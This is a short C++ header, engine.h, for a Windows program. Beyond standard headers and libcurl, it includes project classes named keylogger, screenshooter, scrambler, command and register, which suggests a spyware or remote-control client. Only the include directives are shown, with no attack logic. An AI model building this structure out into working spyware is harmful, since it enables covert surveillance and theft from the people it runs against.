// Filename: engine.h
// Author:   Patryk Połeć

#pragma once

#define _CRT_SECURE_NO_DEPRECATE

#pragma comment(linker, "\"/manifestdependency:type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
#pragma comment(lib, "gdiplus")

using namespace std;

// Include libraries
#include <windows.h>
#include <direct.h>
#include <sstream>
#include <fstream>
#include <string>
#include <ctime>
#include <gdiplus.h>
#include <iomanip>
#include <Shlobj.h>
#include <process.h>
#include <tlhelp32.h>
#include <curl/curl.h>

#include "dirent.h"

// Include class
#include "class.process.h"
#include "class.file.h"
#include "class.scrambler.h"
#include "class.curl.h"
#include "class.register.h"

#include "class.base.h"
#include "class.command.h"
#include "class.keylogger.h"
#include "class.screenshooter.h"
#include "class.application.h"